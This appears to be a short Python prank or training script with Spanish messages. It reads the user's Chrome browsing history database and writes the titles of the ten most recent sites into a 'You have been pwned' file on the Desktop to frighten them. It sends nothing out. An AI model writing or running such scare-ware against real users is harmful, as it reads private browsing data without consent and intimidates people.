import os
from time import sleep
from random import randrange
from pathlib import Path
import sqlite3

#home_path = "/home/" + os.getlogin()
home_path = "{}".format(Path.home())
desktop_path = home_path + "/Desktop/"
FILE = desktop_path + "eps3.7dont-delete-me.ko"
history_path = "/home/" + os.getlogin() + "/.config/google-chrome/Default/History"

def delay_action():
    n_hours = randrange(1, 4)
    print("Durmiendo {} Segundos...".format(n_hours))
    sleep(n_hours)


def create_hacker_file():
    hacker_file = open(FILE, "w")
    hacker_file.write("You have been pwned\n")
    return hacker_file


def get_chrome_history():
    urls = None
    while not urls:
        try:
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls
        except sqlite3.OperationalError:
            sleep(3)


def check_history_and_scare_user(hacker_file, chrome_history):
    maxhist = 10
    for item in chrome_history[:10]:
        hacker_file.write("He visto que has visitado la web de {}\n".format(item[0]))


def main():
    print(FILE)

    delay_action()
    hacker_file = create_hacker_file()
    chrome_history = get_chrome_history()
    check_history_and_scare_user(hacker_file, chrome_history)



if __name__ == "__main__":
    main()
